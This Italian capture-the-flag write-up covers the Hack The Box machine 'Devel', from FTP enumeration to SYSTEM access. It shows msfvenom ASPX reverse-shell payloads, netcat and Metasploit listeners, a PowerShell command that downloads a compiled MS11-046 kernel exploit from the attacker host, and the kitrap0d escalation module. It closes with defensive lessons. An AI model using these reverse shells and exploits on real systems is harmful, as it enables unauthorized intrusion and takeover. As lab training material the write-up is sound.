Devel 

** Author: Noto La Diega Alessandro **

** Target: 10.10.10.5 **

# INFORMATION GATHERING

Iniziamo con una semplice scan di [[Nmap]]:

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -O  10.10.10.5
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 13:30 EDT
Nmap scan report for 10.10.10.5
Host is up (0.044s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
| 05-05-23  06:36PM                 2936 kiwi_passwords.yar
| 05-05-23  06:36PM                 2927 mimicom.idl
| 05-05-23  06:36PM                 5081 README.md
| 05-05-23  06:25PM                 2926 reverse.aspx
| 05-05-23  04:08PM                16393 shell.aspx
| 03-17-17  05:37PM               184946 welcome.png
|_05-05-23  06:45PM               430638 winPEAS.bat
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.07 seconds
```

Abbiamo la porta 21 Ftp con login anonymous, porta 80 sembra un server IIS e tutto lascia pensare che sia un sistema Windows

# ENUMERATION

Iniziamo ad enumerare il servizio [[Port 21 FTP|FTP]]
Dallo scan di nmap si evidenzia che sul servizio ftp è abilitato il login in anonymous
proviamo a sfruttarlo per ottenere un accesso iniziale

```bash
┌──(root㉿kali)-[/home/kali]
└─# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49217|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
05-05-23  06:36PM                 2936 kiwi_passwords.yar
05-05-23  06:36PM                 2927 mimicom.idl
05-05-23  06:36PM                 5081 README.md
05-05-23  06:25PM                 2926 reverse.aspx
05-05-23  04:08PM                16393 shell.aspx
03-17-17  05:37PM               184946 welcome.png
05-05-23  06:45PM               430638 winPEAS.bat
226 Transfer complete.
ftp> 
```

Siamo dentro,abbiamo la conferma che si tratta si un sistema IIS in quanto vediamo dei file .aspx 
Proviamo a vedere se riusciamo a caricare un file sul server

Creiamo un semplice file test.html

```htlm
<html><body>hello</body></html>
```

e lo carichiamo con il comando PUT, visitiamo la pagina http://10.10.10.5/test.html e siamo in grado di vedere il file quindi abbiamo un RCE.

# GAINING A FOOTHOLD

Proviamo a creare e  caricare una revshell.

```bash
┌──(root㉿kali)-[/home/kali/htb/devel]
└─# msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.27 LPORT=4444 -o rev_shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2722 bytes
Saved as: rev_shell.aspx
```

ci mettiamo in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali/htb/devel]
└─# nc -nvlp 4444                                                                               
listening on [any] 4444 ....
```

Otteniamo una shell

```bash
┌──(root㉿kali)-[/home/kali/htb/devel]
└─# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.5] 49232
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

c:\windows\system32\inetsrv>
```


## **GAINING A FOOTHOLD WITH METASPLOIT**

Generiamo un semplice payload con msfvenom:

```bash

┌──(root㉿kali)-[/home/kali/htb/devel]
└─# msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.10.14.39 LPORT=5555 -o met_rev_shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2886 bytes
Saved as: met_rev_shell.aspx
```

Ci colleghiamo al Server remoto tramite ftp anonymouns e scarichiamo il payload generato prima con msfvenom

Apriamo MSFCONSOLE e la settiamo come segue:

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > set LHOST 10.10.14.39
LHOST => 10.10.14.39
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.14.39:5555 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.39:5555 -> 10.10.10.5:49188) at 2023-05-07 13:36:40 -0400
```

Otteniamo cosi un ponto d'ingresso

# PRIVESC

Proviamo ad accedere alle cartelle babies ed Administrator ma non abbiamo i permessi 

Proviamo ad enumerare con systeminfo

```cmd
c:\>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 
System Boot Time:          5/5/2023, 2:54:00 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.473 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.548 MB
Virtual Memory: In Use:    593 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::69bc:5246:1d00:5ab2
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e

```

vediamo che il target monta Windows 7 6.1.7600 e non sono stati fatti dei fix
Cercado su google troviamo l'exploit MS11-046 che sembra fare al caso nostro 
https://www.exploit-db.com/exploits/40564

Ci scarichiamo da searchsploit 

```bash
┌──(root㉿kali)-[/home/kali/htb/devel]
└─# searchsploit -m 40564
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
    Codes: CVE-2011-1249, MS11-046
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/htb/devel/40564.c
```

Compiliamo come da istruzioni

```bash
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

da macchina remota scarichiamo l'exploit

```cmd
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.27:9001/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

Eseguiamo il .exe

```cmd
c:\Users\Public\Downloads>40564.exe
40564.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

 ## **PRIVESC WITH METASPLOIT**

Mettiamo il meterpeter in background e utilizziamo  il seguente modulo postexploitation per vedere cosa possiamo usare per scalre i privilegi

```bash
msf6 post(multi/recon/local_exploit_suggester) > show options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available e
                                               xploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

Abbiamo diversi exploit a cui la macchina sembra vulnerabile:
```bash
 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
```

Proviamo con il ms10_015_kitrap0d,settiamo msfcosole come segue:
```bash
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options 

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.39      yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)

View the full module info with the info, or info -d command.
```

Lanciamo exploit:

```bash
meterpreter > shell
Process 3248 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

c:\windows\system32\inetsrv>
```

# LESSON LEARNED

C'erano essenzialmente due vulnerabilità che ci hanno permesso di ottenere l'accesso a livello di sistema alla macchina.
1. La prima vulnerabilità è stata la configurazione non sicura del server FTP che ci ha permesso di ottenere un punto d'appoggio iniziale. Il nostro primo accesso è stato attraverso l'accesso anonimo. Poi abbiamo scoperto che il server FTP condivideva la directory principale del server web. Pertanto, quando abbiamo caricato una shell inversa nel server FTP, siamo stati in grado di eseguirla utilizzando il browser. Questo ci ha dato una shell privilegiata bassa sulla macchina.

L'utente avrebbe dovuto fare due cose per evitare questa vulnerabilità:
Accesso anonimo disabilitato al server FTP.
Se era necessario l'accesso anonimo, l'utente avrebbe dovuto configurare il server FTP per consentire solo i download. In questo modo l'attaccante non sarebbe stato in grado di caricare i file.

2. La seconda vulnerabilità era una vulnerabilità del kernel di Windows che ci ha permesso di elevare i privilegi. L'utente avrebbe dovuto aggiornare e correggere il proprio sistema quando la vulnerabilità è stata divulgata pubblicamente ed è stato reso disponibile un aggiornamento della sicurezza.
